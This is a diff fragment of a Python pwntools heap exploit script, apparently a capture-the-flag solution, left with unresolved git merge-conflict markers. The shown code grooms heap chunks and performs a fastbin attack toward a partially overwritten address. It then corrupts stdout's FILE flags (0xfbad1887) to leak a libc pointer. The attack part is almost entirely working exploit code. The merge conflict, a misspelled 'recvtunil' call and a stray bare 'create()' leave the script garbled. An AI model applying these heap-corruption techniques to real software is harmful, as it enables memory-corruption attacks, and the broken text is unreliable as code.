@@ -91,6 +91,7 @@ rename(0,pad)
 delete(0)
 delete(1)
 rename(1,"\x18")
+<<<<<<< HEAD
 #0x30
 create(0,0x28,"0")
 pad2 = p64(0x0)*2 +p64(0x91)
@@ -101,10 +102,20 @@ delete(0)
 #0x30
 create(4,0x60,"\xdd\x25")
 #0x130
+=======
+
+create(0,0x28,"0")
+pad2 = p64(0x0)*2 +p64(0x91)
+create(1,0x28,pad2)
+delete(0)
+#why this address
+create(4,0x60,"\xdd\x25")
+>>>>>>> 32894a628e7f486c5c848e6f3e980aaf9726f1e6
 create(5,0x60,"aaaa")
 delete(3)
 delete(5)
 rename(5,"\x30")
+<<<<<<< HEAD
 # fastbin attack 控制到 \xdd\x25地址处
 create(6,0x60,"a")
 create(6,0x60,"b")
@@ -113,4 +124,7 @@ pad="\x00"*3+p64(0)*6+p64(0xfbad1887)+p64(0)*3+"\x00"
 rename(6,pad)
 p.recvtunil("\x7f")
 
+=======
+create()
+>>>>>>> 32894a628e7f486c5c848e6f3e980aaf9726f1e6
 
